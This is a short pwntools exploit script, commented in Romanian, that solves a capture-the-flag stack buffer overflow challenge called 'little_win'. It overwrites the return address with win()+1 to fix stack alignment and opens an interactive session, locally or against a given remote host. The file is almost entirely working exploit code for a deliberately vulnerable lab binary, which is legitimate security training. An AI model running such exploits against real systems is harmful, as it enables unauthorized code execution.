#!/usr/bin/env python3
# ============================================================================
# CTF: little_win — ret2win (stack BOF, x64)
# Vulnerabilitate: overflow (64 + 8 rbp) => return in win(). Se foloseste win+1
#   pentru alinierea stivei la 16 bytes (sare peste push rbp, evita crash-ul
#   dintr-un movaps din libc cand RSP nu e aliniat).
# Binar: ELF 64-bit (amd64), not stripped | NX OFF · fara canary · No-PIE · Partial RELRO
#   - Fara canary + No-PIE => ret2win direct la adresa fixa. +1 pe adresa = trucul
#     de aliniere specific x86-64.
# ============================================================================
import sys
from pwn import *

context.binary = elf = ELF('./little_win')
context.log_level = 'error'          # scoate zgomotul pwntools

def connect():
    if len(sys.argv) >= 3 and sys.argv[2].isdigit():
        return remote(sys.argv[1], sys.argv[2])
    return process('./little_win')

p = connect()

win = elf.symbols['win']

p.recvuntil(b"Guess my pet name")
payload = b'A' * 64 + b'A' * 8 + p64(win + 1) # sa incerc cu + 1 daca nu merge fara
p.sendline(payload)

p.interactive()